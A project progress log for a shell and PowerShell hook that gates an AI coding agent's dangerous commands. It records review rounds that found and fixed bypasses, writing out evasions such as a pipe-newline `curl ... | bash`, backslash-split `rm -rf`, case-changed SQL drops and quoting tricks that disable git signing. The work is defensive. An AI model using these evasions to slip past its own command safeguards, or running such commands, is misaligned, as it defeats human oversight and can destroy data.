  suite-verified identical. Both deserve their own change, not a tenth round on this one.
- 🔴 **Two PRE-EXISTING BLOCK-tier evasions filed as separate tasks, deliberately not absorbed:** sh
  matches case-SENSITIVELY while ps1 is OrdinalIgnoreCase (`psql -c 'Drop Table users'` gets no
  verdict on sh, and SQL keywords are case-insensitive so it really drops the table); and a trailing
  `|` is a real line continuation, so `curl http://x |⏎bash` evades BLOCK entirely. Both are on `main`
  today and are more severe than anything this branch introduced. **Absorbing findings like these is
  what kept this branch from converging for nine rounds.**
- ✅ **APPROVED and COMMITTED as `08cb444`** (32 files, 3575+/156-, an exact set match to contract scope). First Approve in nine rounds; Opposition wrote the marker and the commit gate consumed it. It downgraded **both** Correctness blockers on measured counter-evidence — a 16-case matrix showed both **sh-only**, ps1 catches them, verdicts identical to `main` — and disproved one of its own findings. **PR #21 opened; NOT merged as of 2026-08-25.**
- 📌 **Opposition's sharpest finding is not a bug and is OPEN:** the `.*` widening expands the false-positive surface while this file's own notes reject gating truthy spellings as training the operator to dismiss the prompt. Three of its probes were denied mid-review; two more in the follow-up session (`[NS-25]` 20-21). Severity calibration also called inverted.
- 📌 **A verification claim of mine was incomplete:** "all 7 mirror pairs byte-identical" — more are in scope, and `standards/MEMORY-BANK.md` diverges inverted (LIVE says `mb compact`, which `mb.sh` exits 2 on). Pre-existing `[NS-33]`(c).
- ✅ **Follow-up: five sh/ps1 fixes** — `.gitignore` reconciliation now runs on `upgrade`; check 5 compares VALUES; three stale 50% constants (incl. the shipped mirror) defer by name. **Live bug in my own helper:** `grep -qxF` misses every entry on a CRLF file under real GNU grep, so `upgrade` from Linux re-appended all 11 entries every run. Fixed + mutation-tested. Committed 2026-08-26.
- **Verified at completion:** bash 448/19 suites/0 · `dangerous-commands` 124/0 in C, C.UTF-8, en_US.UTF-8 · Pester 58/0 · PSScriptAnalyzer 0/23 · trim 321/289 · scope 32/32.

## 2026-08-24 (rounds 8-9) — Round 8's Fixes Rejected by Round 8; Round 9 Then Found the Gap Class Was Itself a Bypass

**Round 8 was STOPPED after 3 of 6 domains on user direction — Security, Correctness and Testing ran; Maintainability, Architecture Drift, Performance and Opposition did NOT. An incomplete review, not a clean Request Changes; no marker written.** Those three still returned four blocking findings, two of them defects in the round-8 fixes themselves. All now fixed.

- ✅ **F1 (cp1252 extraction).** The fix `handoff.md` carried as "designed and proven" was proven against ONE payload shape and would have shipped a live bypass: stdin/stdout are cp1252 with `errors='surrogateescape'`, so escaped payloads break a text-mode WRITE and raw UTF-8 breaks a text-mode READ; the shipped code survived raw payloads only *by accident* (mojibake round-tripping through one codec). Round 8's own binary fix was then incomplete too — strict codecs made lone surrogates and non-UTF-8 bytes RAISE, dropping to raw-stdin matching, which BLOCKed on a trigger phrase in `description`. Final form: bytes first, `surrogateescape` decode fallback, `surrogatepass` write. **8/8 payload classes; the single-codec forms scored 6/8 and 7/8.**
- ✅ **F2 (`confirm_boundary()`)** — all five sh matchers use `cmd_loose`; reverting turns exactly the 3 escape/quote cases red.
- 🔴 **F3, and round 8's fix for it BROKE A LIVE GATE.** Round 7's 16.2s used a payload that was not
  the worst case; the driver is `config`-token density and growth was **CUBIC**, so 50,000 chars was
  ~47 MINUTES per pattern — a hang, reachable by a heredoc writing prose about `git config`. Round 8
  bounded **all six** gaps to `{0,200}`; Security and Correctness independently found that in
  `git (<gap>)--no-gpg-sign` the gap holds the COMMIT MESSAGE, so any message over ~185 chars
  silently defeated the CONFIRM on both shells. **The generalisation was the error** — "real gaps are
  tiny" is true of the `config` gaps and false of the message gap. Corrected by measuring per pattern:
  only the nested pair blows up, so only those four are bounded.
- 🔴 **My bash timing assertion was a TAUTOLOGY** — `assert_contains "fast" "fast"`. Reverting all six bounds left the suite green at 108/0. GNU grep is a DFA and never gets slow; I had *said* so aloud, wrote the assertion anyway, and counted it in "every new assertion was confirmed to discriminate". I proved the REGEX discriminates, never the ASSERTION. **This violated the Evidence Integrity rule in the same diff that introduces it.** Replaced with a structural invariant. The Pester timing test dropped 50,000 → 8,000 chars: at 50,000 a regression takes ~3 HOURS, i.e. hangs CI rather than failing it.
- 🔴 **F4's premise was wrong too: `${#cmd}` counts CHARACTERS PER LOCALE, not bytes.** So moving ps1
  to `UTF8.GetByteCount` INVERTED the divergence rather than closing it, and the assertion failed
  under `C.UTF-8`/`en_US.UTF-8` — CI's locales. sh now uses `wc -c`; asserted across three locales.
- ✅ **F5 (non-discriminating tab test) fixed by deleting redundant CODE, not rewriting the test.**
  Neutering the sole fold site turns 2 assertions red. A sweep also found 2 pre-existing parity
  assertions and 2 new sanity checks that still cannot fail — open, not fixed.
- ✅ **Coverage after round 8:** sh 99 → 117, Pester 49 → 55, every new assertion mutation-proved.
  **The canary earned its place** — the harness first reported four false "non-discriminating"
  verdicts because `bash` resolved to a WSL stub; only the canary failing too revealed the fault.
- 📌 **The lesson: a claim in a comment stronger than the code delivers.** "Measured 2/2 correct",
  "zero semantic change", "agree by construction", "confirmed to discriminate" — each falsified by a
  single probe a reader could have run.

### Round 9, first three domains (2026-08-24) — completed 2026-08-25, see the section above

Security, Correctness and a Testing-equivalent pass ran this day under the new remediation rule
(**only a demonstrated live bypass earns code; everything else becomes a documented limit**). The
remaining three domains plus Opposition ran 2026-08-25 and the outcome is recorded there; only what
these three found is kept here.

- 🔴 **The gap character class was ITSELF a live bypass** — the sharpest finding of any round, reached
  independently by two domains. Gaps were `[^|;&]*`, so any `|`, `;` or `&` between `git` and the flag
  made a pattern unmatchable — and in the `-c` and `--no-gpg-sign` patterns that gap holds the COMMIT
  MESSAGE. Verified allowed with no prompt on both shells: `git commit -m "docs: R&D notes"
  --no-gpg-sign`. An ampersand in English prose is not evasion. **And the class never did its job**:
  newline was never excluded, so the gap already spanned commands.
- ✅ Fixed to `.*` on those two patterns. `[^newline]` is not portable — a literal newline inside a
  grep pattern SPLITS it into two patterns, measured — so `.*` plus .NET `Singleline` is what makes
  the engines agree. That flag is the **third** instance of this file's line-vs-string mismatch
  (`sed` vs `-replace`, `grep` vs `-imatch`, now `.` vs `.`), fixed in the same change that would
  have exposed it — which is what `confirm_regex()`'s comment asked for.
- 🔴 **Two PRE-EXISTING BLOCK-tier evasions found and filed as separate tasks** (sh case-sensitivity;
  pipe-newline continuation). Detail in the 2026-08-25 section.

## 2026-08-24 (continued) — Review Round 7 — condensed; all five findings superseded by rounds 8-9

Round 7 returned Request Changes with five blocking findings. **All are recorded in full at their
point of resolution in the rounds 8-9 entry above, which also corrects two of round 7's own claims** —
so this section is condensed to the durable facts rather than repeated.

- 🔴 **CRITICAL, PRE-EXISTING: the sh hook's python3 extraction ran text-mode I/O under Windows
  `cp1252`, so any non-ASCII command silently degraded to raw-stdin matching** — the exact
  false-positive mode the extraction exists to prevent. A CJK payload made sh DENY with "command is
  120057 characters" (the byte length of the whole JSON file) while the ps1 twin allowed it: opposite
  verdicts on ordinary input. NOT introduced by this branch. Round 8 found the proposed fix was
  proven against only one payload shape; see above.
- 🔴 The de-escaped-view retrofit reached four of five matcher functions — `confirm_boundary()` had
  zero `cmd_loose` references, so `git m\erge main` was SILENT in sh and CONFIRM in ps1.
  **Why the mutation proof missed it:** removing `cmd_loose` turned the S1 test red, proving the
  mechanism works WHERE WIRED, which says nothing about whether every matcher is wired.
  **Coverage failures wear correctness clothing** — the cheap guard is a COMPLETENESS invariant,
  a different tool from a discrimination check.
- 🔴 The de-escaped view doubled the worst-case stall and the accompanying comment understated it;
  the length-bound units diverged (bash bytes vs .NET UTF-16). Both re-measured and corrected in
  rounds 8-9 — round 7's own figures turned out to be measured on the wrong payload shape.
- 🔴 **A whitespace-collapse made a PRE-EXISTING tab test non-discriminating**: neutering the original
  `tr`/`.Replace` left the payload byte-identically CONFIRMed, so the NBSP platform-parity regression
  guard was silently gone. No live bypass, but this is the Failure Criterion added to
  `standards/CODE-REVIEW.md` in the same diff. Fixed in round 8 by deleting the redundant path.
- ✅ Testing independently re-ran the mutation proof and confirmed it, and verified
  `PMB_REQUIRE_PARITY=1` hard-fails when pwsh is absent. **Stated caveat: no exhaustive assertion
  sweep** — round 8's sweep then found further non-discriminating assertions.
- 📌 **Third instance of coverage-not-correctness, and a new sub-shape:** adding a redundant
  normalization path silently DISARMS an existing guard without failing it. Mutation testing catches
  a test that never guarded anything; it does not catch a test whose guard migrated elsewhere.

## 2026-08-24 — Review Round 6: One Blocker, Two Pre-Existing Bypasses Closed, Cap Metric Fixed

- 📌 **Verdict: Request Changes — but a different shape of failure from rounds 1-5.** Six domain
  agents plus Opposition (Opus). Eight findings arrived `Blocking: true`; Opposition downgraded
  seven on counter-evidence and **refuted one outright**. Rounds 1-5 each found a NEW live bypass
  introduced by the change; round 6 found none. Measured against `HEAD`, the change closes two
  bypasses `main` still has and introduces zero.
- 🔴 **C1, the sole surviving blocker — and the second time this exact mismatch shipped in this
  file.** `confirm_regex`'s `grep` is line-based; the `.ps1` twin's `-imatch` is not. So
  `git commit -m "<two-line message>" --no-gpg-sign` passed silently in sh and denied in ps1.
  `CHANGELOG.md:44` records that round 4's argument-stripping was withdrawn *because* `sed` is
  line-based while .NET `-replace` is not — the replacement reintroduced the identical defect one
  function over. Fixed with `grep -z`; noted in-code so a third instance is harder to write.
- ✅ **Two PRE-EXISTING bypasses closed (S1, S3), both outside the four documented KNOWN LIMITS.**
  A shell strips a backslash before ANY character, so `r\m -r\f` runs as `rm -rf` — that defeated
  the BLOCK tier outright and pre-dates the signing work. Adjacent quoted segments concatenate, so
  `git config "commit."'gpgsign' false` evaded CONFIRM. Both closed by matching every tier against
  a second, deliberately de-escaped view in addition to the faithful one — strictly fail-closed,
  it can only add matches. Cost documented, not hidden: `echo "rm" "-rf"` now trips BLOCK.
- 📌 **S4/S5 are NOT fixable and are documented instead.** Command substitution
  (`commit.gpgsign $(echo false)`) and variable indirection (`K=...; git config "$K" false`) need
  the shell EVALUATED, not read. Patterns that appeared to cover them would be a false claim of
  coverage — the failure the KNOWN LIMITS block exists to prevent.
- 🔴 **The round-5 "doubled backslash fail-closed" test could not fail.** It left `rm -rf` intact
  on line 2, where newline-insensitive substring matching found it whether the join worked, broke,
  or was deleted. It was written *while* `verification-before-completion` was being invoked, and it
  survived a substantial rewrite of the join without going red. Found by review, not by the suite.
- ✅ **Every replacement mutation-proved.** Removing the join, the de-escaped view, `grep -z`, or
  the length bound each turns its guarding assertion red. Two traps hit while proving it, both now
  written into `standards/CODE-REVIEW.md`: a mutation that changes BYTES has not necessarily changed
  BEHAVIOUR (an inert mutator produced a false "test doesn't guard this"), and redundant match paths
  mask mutations (the de-escaped view answered while the mutated path was disabled).
- ✅ **`standards/CODE-REVIEW.md` gains an Evidence Integrity section:** a check that cannot fail
  does not count, and a self-attested completion counts as UNMET — worse than an admitted gap.
  Mutation testing was already PMB practice (three uses recorded here) but was undocumented
  folklore with no tooling; `tests/helpers/` has `assert.sh` and `stub-pwsh.sh` and nothing else.
  Tooling deliberately NOT built under a Request-Changes cycle — spun off as its own spec task.
- ✅ **P3/P1: input length bound at 50,000 chars, fail-closed.** Two CONFIRM regexes go quadratic
  under .NET backtracking (measured: 35 KB→3.9s, 140 KB→53.7s, 350 KB→no finish in 180s; GNU grep
  stayed flat). It REFUSES rather than truncating — truncation is fail-open, since a dangerous
  substring straddling the cut would vanish. Applied identically in both shells on purpose.
- ✅ **The line cap was the wrong metric and is now raised 400 → 600.** At 400 the file was 39,590
  bytes against a 48,000 WARN — the line cap bound first, which is the dimension `[NS-28]` already
  identified as wrong. Not theoretical: round 5's findings were written under round 4's heading for
  lack of room, and a 34-line relocation was absorbed by one subsequent entry. Byte WARN now fires
  first. Earlier the same session this was declined as the user-as-bypass shape; that objection was
  to AUTHORIZATION, not the technical case, and the user directed it explicitly.
- 📌 **Docs corrected:** `HOOKS-GUIDE.md` claimed the `mb validate` shim exits 0 (it exits 2 — the
  code was fixed in the same change, the doc was not); the KNOWN LIMITS block listed one of three
  accepted false positives and misstated the `GIT_CONFIG_*` cause (the anchor token is absent
  entirely, not merely mis-positioned); `activeContext.md` said the relocation ended at 392/400
  where `progress.md` said 372 — 372 is correct, 392 was the post-entry figure.
- 📌 **External evaluation — the `Unlazy` skill (gates ledger).** Adopted: the self-attestation rule
  only. Rejected: task tree, depth number, solo/orchestrated modes, parallel dispatch — PMB's
  bottleneck is verification integrity, not throughput, and `[NS-24]` Task #33 was deferred
  precisely to avoid a third overlapping mechanism. Key limitation recorded: a gates file proves a
  command RAN and matched text, which would NOT have caught the vacuous test above.
- **State:** 19 suites / 423 assertions / 0 failures; `test-dangerous-commands.sh` 99/0; Pester
  49/0; PSScriptAnalyzer 0 across 23 files; five mirror pairs byte-identical; `HOOKS-GUIDE` trim
  intact (318/289). Contract at 26 files. Round 7 not yet run.

## 2026-08-23 — Review Round 4: A Pre-Existing Critical, and a Fix Withdrawn

- 🔴 **Backslash line-continuation defeated the whole hook — present since v1, missed by three rounds.**
  The shell strips `\`+newline before git sees it, so a wrapped command ran as its one-line form while
  the hook matched raw two-line text. Verified live: `commit.gpgsign` `true`→`false`, no prompt. Not
  signing-specific — wrapped `git push --force` evaded BLOCK too. Took 3 attempts: substituting a space
  shipped 2 more bypasses (mid-token splits), so the join deletes + collapses. Quoted keys also ungated.
- 📌 **Round-3's argument-stripping was withdrawn** (user call). Making the hook's view differ from what
  the shell runs cost two defects — `sed` line-based vs .NET not, and unquoted multi-word args
  half-stripped — to buy 1 of 4 false positives anchoring already fixed; the 4th is a KNOWN LIMIT now.
- 📌 **`mb validate` exits 2, not 0** — old Check 7 emitted a permanent false `[WARN]`, not a false
  `[OK]`; wrong in code, here, and `activeContext.md`, now fixed in all three. Seen on ACR (1.1.1);
  `pre-push-check.*` is TEMPLATE_OWNED, so landing this branch ships the fix. `[NS-25]` hit twelve.

## Sources

- Claude Code — *How Claude remembers your project*: https://code.claude.com/docs/en/memory
- Anthropic — *Effective context engineering for AI agents*:
  https://www.anthropic.com/engineering/effective-context-engineering-for-ai-agents
- Anthropic — *Equipping agents for the real world with Agent Skills*:
  https://www.anthropic.com/engineering/equipping-agents-for-the-real-world-with-agent-skills
- McMillan, D. (2026). *Instruction Adherence in Coding Agent Configuration Files: A Factorial Study
  of Four File-Structure Variables.* arXiv:2605.10039 — https://arxiv.org/abs/2605.10039
- Zhang, Hu, Upasani et al. (2026). *Agentic Context Engineering: Evolving Contexts for
  Self-Improving Language Models.* ICLR 2026, arXiv:2510.04618 — https://arxiv.org/abs/2510.04618
- Hong, Troynikov, Huber (2025). *Context Rot: How Increasing Input Tokens Impacts LLM Performance.*
  Chroma — https://www.trychroma.com/research/context-rot
- Dunlop — *CLAUDE.md best practices: what the evidence supports* (secondary summary of
  arXiv:2605.10039) — https://www.alexdunlop.com/writing/claude-md-best-practices
- alexop.dev — *Stop bloating your CLAUDE.md: progressive disclosure*:
  https://alexop.dev/posts/stop-bloating-your-claude-md-progressive-disclosure-ai-coding-tools/
- AGENTS.md spec guide — https://www.morphllm.com/agents-md-guide
